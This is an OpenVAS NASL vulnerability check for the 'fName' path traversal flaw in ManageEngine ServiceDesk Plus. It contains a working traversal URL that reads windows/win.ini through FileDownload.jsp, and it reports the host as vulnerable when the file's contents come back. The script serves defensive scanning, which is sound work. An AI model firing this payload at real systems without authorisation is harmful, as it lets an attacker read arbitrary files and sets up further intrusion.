###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_manage_engine_servicedesk_plus_path_traversal_vuln_oct15.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# ManageEngine ServiceDesk Plus 'fName' Parameter Path Traversal Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:manageengine:servicedesk_plus";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806510");
  script_version("$Revision: 11872 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-10-21 13:10:53 +0530 (Wed, 21 Oct 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("ManageEngine ServiceDesk Plus 'fName' Parameter Path Traversal Vulnerability");

  script_tag(name:"summary", value:"This host is installed with ManageEngine
  ServiceDesk and is prone to path traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not.");

  script_tag(name:"insight", value:"The flaw is due to insufficient sanitization
  of user-supplied input via 'fName' parameter in 'FileDownload.jsp'.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to read arbitrary files and to obtain sensitive information which
  may lead to further attacks.");

  script_tag(name:"affected", value:"ManageEngine ServiceDesk Plus version
  9.1 build 9110 and previous versions.");

  script_tag(name:"solution", value:"Upgrade to ManageEngine ServiceDesk Plus
  version 9.1 build 9111 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/38395");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_ManageEngine_ServiceDesk_Plus_detect.nasl");
  script_mandatory_keys("ManageEngine/ServiceDeskPlus/installed");
  script_require_ports("Services/www", 8080);
  script_xref(name:"URL", value:"https://www.manageengine.com");
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!appPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:appPort)){
  exit(0);
}

url = dir + 'workorder/FileDownload.jsp?module=support&fName=..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00';

if(http_vuln_check(port:appPort, url:url, check_header:TRUE,
   pattern:"; for 16-bit app support",
   extra_check:make_list("[extensions]", "SetupFileName", "DefaultAdmin")))
{
  report = report_vuln_url( port:appPort, url:url );
  security_message(port:appPort, data:report);
  exit(0);
}
